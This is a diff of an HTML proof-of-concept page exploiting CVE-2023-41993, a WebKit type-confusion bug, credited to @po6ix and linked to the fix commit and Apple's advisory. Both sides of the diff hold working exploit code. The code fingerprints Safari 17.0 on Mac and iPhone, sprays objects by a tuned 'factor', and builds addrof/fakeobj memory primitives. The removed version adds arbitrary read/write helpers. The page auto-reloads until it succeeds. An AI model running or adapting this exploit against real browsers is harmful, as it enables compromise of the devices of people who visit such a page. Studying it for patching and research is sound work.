@@ -5,156 +5,160 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="util.js"></script>
     <script src="int64.js"></script>
-    <title>CVE-2023-41993 PoC</title>
+    <title>Document</title>
 </head>
 <body>
+    <p id="factors"></p>
     <p id="status"></p>
-    <button onclick="resetProgress()">Reset Progress</button>
     <script>
-        /*
-        author: @po6ix
-        commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
-        advisory: https://support.apple.com/en-us/HT213926
-        */
-        let boxed_arr = new Function();
-        boxed_arr.p1 = 1.1;
-        boxed_arr[0] = {};
+/*
+author: @po6ix
+commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
+advisory: https://support.apple.com/en-us/HT213926
+*/
+let boxed_arr = new Function();
+boxed_arr.p1 = 1.1;
+boxed_arr[0] = {};
 
-        let getter = new Function();
-        getter.p1 = 1.1;
-        getter[0] = 1.1;
+let getter = new Function();
+getter.p1 = 1.1;
+getter[0] = 1.1;
 
-        let shape = {};
-        for (let i = 0; i < 14; ++i) {
-            shape['p' + i] = i;
+let shape = {};
+for (let i = 0; i < 14; ++i) {
+    shape['p'+i] = i;
+}
+
+let shapes = [];
+for (let i = 0; i < 100; ++i) {
+    shapes.push({
+        ...shape,
+        ['z'+i]: 0x1337
+    });
+}
+
+function trigger(type) {
+    let object_a = {};
+    object_a.foo = 1;
+    object_a.p1 = 1.1;
+
+    let object_b = {};
+    object_b.__defineGetter__('p1', getter);
+    object_b.foo = 1;
+
+    function get_getterSetter(type) {
+        let o, retval;
+
+        if (type == 0) o = object_a;
+        else o = object_b;
+
+        for (let i = 0; i < 2; ++i) {
+            if (type == 0) retval = o.foo;
+            else retval = o.foo;
         }
+        return retval;
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    return [getter, get_getterSetter(1)];
+}
 
-        let shapes = [];
-        for (let i = 0; i < 100; ++i) {
-            shapes.push({ ...shape, ['z' + i]: 0x1337 });
+(function pwn() {
+    let [getter, getterSetter] = trigger();
+    let success = false;
+    try {
+        getterSetter.toString();
+    } catch(e) {
+        // it should fail to call toString
+        success = true;
+    }
+    if (!success) {
+        document.getElementById("factors").innerHTML = "Tried factor: " + factor; // عرض factor المجرب
+        document.getElementById("status").innerHTML = "Exploit failed.. Trying again!";
+        location.reload();
+        return;
+    }
+
+    let symbolObject = Object(getterSetter);
+
+    let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
+    let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
+    let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
+    let factor;
+    let unknown_device = false;
+
+    if (isMac && version == '17.0') {
+        factor = 840;
+    } else if (isIphone && version == '17.0') {
+        factor = 87;
+    } else {
+        factor = 87 + Math.floor(Math.random() * 1000);
+        unknown_device = true;
+    }
+
+    // عرض factor المجرب قبل التجربة
+    document.getElementById("factors").innerHTML = "Tried factor: " + factor;
+
+    let ref_arr = [];
+    for (let i = 0; i < factor; ++i) {
+        ref_arr.push(symbolObject.description);
+    }
+
+    getter.p13 = 1.1; // change the length of boxed_arr
+    let unboxed_arr = getter;
+
+    function addrof(o) {
+        boxed_arr[8] = o;
+        return Int64.fromDouble(unboxed_arr[0]);
+    }
+
+    function fakeobj(addr) {
+        unboxed_arr[0] = addr.asDouble();
+        return boxed_arr[8];
+    }
+
+    let sample = BigInt(addrof({}).toString());
+    if (sample >= 0x200000000 || sample < 0x100000000) {
+        document.getElementById("factors").innerHTML = "Tried factor: " + factor; // عرض factor المجرب عند الفشل
+        // alert('failed');
+        location.reload();
+        return;
+    } else {
+        alert(`success!!!`);
+        if (unknown_device) {
+            alert(`It seems you have found a valid factor for an untested device!\nIf you send this information to me, it could be helpful to others.\nisMac: ${isMac}, isiPhone: ${isIphone}, version: ${version}, factor: ${factor}, userAgent: ${navigator.userAgent}`);
+            document.getElementById("status").innerHTML = "Success!";
         }
+        document.getElementById("factors").innerHTML = "Successful factor: " + factor; // عرض factor الناجح
+    }
 
-        function trigger(type) {
-            let object_a = {};
-            object_a.foo = 1;
-            object_a.p1 = 1.1;
-
-            let object_b = {};
-            object_b.__defineGetter__('p1', getter);
-            object_b.foo = 1;
-
-            function get_getterSetter(type) {
-                let o, retval;
-                if (type == 0) o = object_a;
-                else o = object_b;
-                for (let i = 0; i < 2; ++i) {
-                    if (type == 0) retval = o.foo;
-                    else retval = o.foo;
-                }
-                return retval;
-            }
-            for (let i = 0; i < 1e6; ++i) {
-                get_getterSetter(i % 2);
-            }
-            return [getter, get_getterSetter(1)];
-        }
-
-        function resetProgress() {
-            sessionStorage.removeItem('triedFactors');
-            document.getElementById("status").innerHTML = "Progress reset, reloading...";
-            setTimeout(() => location.reload(), 1000);
-        }
-
-        (function pwn() {
-            let [getter, getterSetter] = trigger();
-            let success = false;
-            try {
-                getterSetter.toString();
-            } catch (e) {
-                success = true;
-            }
-            if (!success) {
-                document.getElementById("status").innerHTML = "Exploit failed.. Trying again!";
-                setTimeout(() => location.reload(), 1000);
-                return;
-            }
-
-            let symbolObject = Object(getterSetter);
-
-            // قائمة القيم غير المتكررة مؤقتة (في جلسة واحدة)
-            let allFactors = Array.from({ length: 1001 }, (_, i) => 87 + i);
-            let triedFactors = JSON.parse(sessionStorage.getItem('triedFactors')) || [];
-            let availableFactors = allFactors.filter(f => !triedFactors.includes(f));
-            let factor;
-            if (availableFactors.length > 0) {
-                let randomIndex = Math.floor(Math.random() * availableFactors.length);
-                factor = availableFactors[randomIndex];
-                triedFactors.push(factor);
-                sessionStorage.setItem('triedFactors', JSON.stringify(triedFactors));
-            } else {
-                factor = 87 + Math.floor(Math.random() * 1000);
-            }
-
-            // طباعة القيمة المجربة
-            document.getElementById("status").innerHTML = "Trying factor = " + factor;
-
-            let ref_arr = [];
-            for (let i = 0; i < factor; ++i) {
-                ref_arr.push(symbolObject.description);
-            }
-
-            getter.p13 = 1.1;
-            let unboxed_arr = getter;
-
-            function addrof(o) {
-                boxed_arr[8] = o;
-                // محاولة التعامل مع NaN-boxing إذا لزم الأمر
-                let addr = Int64.fromDouble(unboxed_arr[0]);
-                return addr; // سيعود كائن Int64
-            }
-
-            function fakeobj(addr) {
-                unboxed_arr[0] = addr.asDouble();
-                return boxed_arr[8];
-            }
-
-            let testObj = { x: 0x1234 };
-            let addr = addrof(testObj);
-            let sample = BigInt(addr.toString());
-            if (sample >= 0x200000000 || sample < 0x100000000) {
-                document.getElementById("status").innerHTML = "Failed with factor = " + factor + ". Trying again...";
-                setTimeout(() => location.reload(), 1000);
-                return;
-            } else {
-                // اختبار صحة addrof
-                let fake = fakeobj(addr);
-                if (fake.x === testObj.x) {
-                    alert("Success!!! factor = " + factor + " - addrof is valid!");
-                    document.getElementById("status").innerHTML = "Success with factor = " + factor + " - addrof valid!";
-                    alert("Address: " + addr.toString());
-                    alert("Address: " + addr.toString());
-                    alert("Address: " + addr.toString());
-                    alert("Address: " + addr.toString());
-
-                    // تطوير r/w
-                    function read(addr) {
-                        let fake = fakeobj(addr);
-                        return fake[0];
-                    }
-                    function write(addr, value) {
-                        let fake = fakeobj(addr);
-                        fake[0] = value;
-                    }
-                    alert("Read test: " + read(addrof({ x: 0x1234 })).toString());
-                    write(addrof({ x: 0x1234 }), 0x5678);
-                    alert("Write test: " + addrof({ x: 0x1234 }).x.toString());
-                } else {
-                    alert("Success!!! factor = " + factor + " - addrof may need adjustment!");
-                    document.getElementById("status").innerHTML = "Success with factor = " + factor + " - addrof questionable!";
-                }
-                sessionStorage.removeItem('triedFactors');
-            }
-        })();
+    alert(addrof({}).toString());
+    alert(addrof({}).toString());
+    alert(addrof({}).toString());
+    alert(addrof({}).toString());
+})();
     </script>
 </body>
 </html>
